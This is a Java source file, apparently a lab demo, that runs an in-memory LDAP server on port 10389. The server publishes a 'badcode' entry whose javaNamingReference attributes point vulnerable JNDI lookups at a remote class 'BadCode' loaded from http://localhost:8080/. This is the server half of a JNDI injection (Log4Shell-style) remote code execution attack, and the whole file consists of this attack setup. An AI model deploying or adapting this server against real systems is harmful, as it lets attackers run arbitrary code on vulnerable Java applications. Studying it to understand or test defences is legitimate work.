package de.predic8;

import java.net.InetAddress;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.*;

public class LdapServer {

    public static void main ( String[] args ) throws Exception {
        InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=predic8,dc=de");

        InMemoryListenerConfig listenerConfig = new InMemoryListenerConfig(
                "foo",
                InetAddress.getByName("0.0.0.0"),
                10389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault());

        serverConfig.setListenerConfigs(listenerConfig);
        serverConfig.setSchema(null);
        serverConfig.setEnforceSingleStructuralObjectClass(false);
        serverConfig.setEnforceAttributeSyntaxCompliance(true);

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);

        {
            DN dn = new DN("dc=predic8,dc=de");
            Entry e = new Entry(dn);
            e.addAttribute("objectClass", "top", "domain", "extensibleObject");
            e.addAttribute("dc", "predic8");
            ds.add(e);
        }
        {
            DN dn = new DN("cn=badcode,dc=predic8,dc=de");
            Entry e = new Entry(dn);
            e.addAttribute("objectClass", "top", "domain", "extensibleObject", "javaNamingReference");
            e.addAttribute("cn", "badcode");
            e.addAttribute("javaClassName", "BadCode");
            e.addAttribute("javaCodeBase", "http://localhost:8080/");
            e.addAttribute("javaFactory", "BadCode");
            ds.add(e);
        }
        ds.startListening();
    }
}

